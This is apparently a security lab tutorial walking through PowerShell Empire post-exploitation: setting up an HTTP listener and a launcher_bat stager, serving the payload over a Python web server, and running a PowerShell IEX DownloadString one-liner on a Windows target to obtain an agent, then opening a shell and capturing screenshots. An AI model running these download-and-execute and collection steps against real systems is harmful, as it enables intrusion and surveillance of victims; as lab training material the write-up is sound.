# Welcome to Cyber Secure Labs

Working with the newest version of Powershell Empire

Public Site for sharing security writes

## Post Exploitation

### Working with Powershell Empire

Empire is a “PowerShell and Python post-exploitation agent” with a heavy focus on client-side

**Windows Platform: `Exploitation and post exploits are performed using Powershell.`**

**Linux & macOS: `Exploitation requires Python 2.6 or 2.7`**

In the latest version of Powershell Empire comes with a cleint-server model.

To start the server, the command is below:

```bash
sudo powershell-empire server

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled.png)

To start the client, the command is below:

```bash
sudo powershell-empire client

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%201.png)

Use the following command to list all listeners, if any is still running:

Command:

`listners`

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%202.png)

You can use the following command to kill a active listener:

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%203.png)

**Command:**

syntax: kill <name of listener>

kill test

kill http

After starting both the client an server, the methodology used to carry out an attack are as follows:

1. Start a Listener
2. Start a Stager
3. Listing the Agents
4. Interact with the agents
5. Run Post Exploitation commands

### Setting up a listener:

```
uselistener http

set Name http

set Host 192.168.119.208

set Port 4443

execute
```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%204.png)

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%205.png)

Before we setup a stager, we will check to ensure no agents are currently running with the below 

**Command:**

`agents`

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%206.png)

If an agent was running and you would like to kill it, simply use the command below:

**syntax:** 

`kill <name of the agent>`

### Setting up a stager:

We will set our stager to: `windows/launcher_bat` and set our listener to be `http` just as we have named it when setting up the listener and execute it to start the listener.

```bash
usestager windows/launcher_bat

set Listener http

execute

```

After setting up the stager with the above commands, the follow payload will be exported to your a location on your machine.  In the context of this exercise, we will copy the exported payload and save to a directory and serve it to our target machine via a python web server.

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%207.png)

We will start a Python web server and transfer the file onto the windows target.

Command: 

`python3 -m http.server 3030`

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%208.png)

On the windows target machine,we will download the file and execute it without saving it to the target machine local hard-disk with the below power-shell command:

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%209.png)

```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.208:3030/launcher.bat')
```

After executing the command above and hit enter twice at the command prompt, our script executes and a session is passed back to our powershell empire listening console.

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2010.png)

### Setting up a stager:

From the above, we can see that a new agent A26S4CZV checked in

We can use the below command to list all agents

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2011.png)

```
agents

```

Interacting with an agent is simple as using the below syntax

interact <agent name>

Example: 

```
interact A26S4CZV

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2012.png)

### Post Exploitation Commands:

```
info

```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2013.png)

Using the command shell:

Command:

`shell`

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2014.png)

### Taking a Screenshot of Target Machine's desktop

```
usemodule powershell/collection/screenshot
execute
```

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2015.png)

![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2016.png)
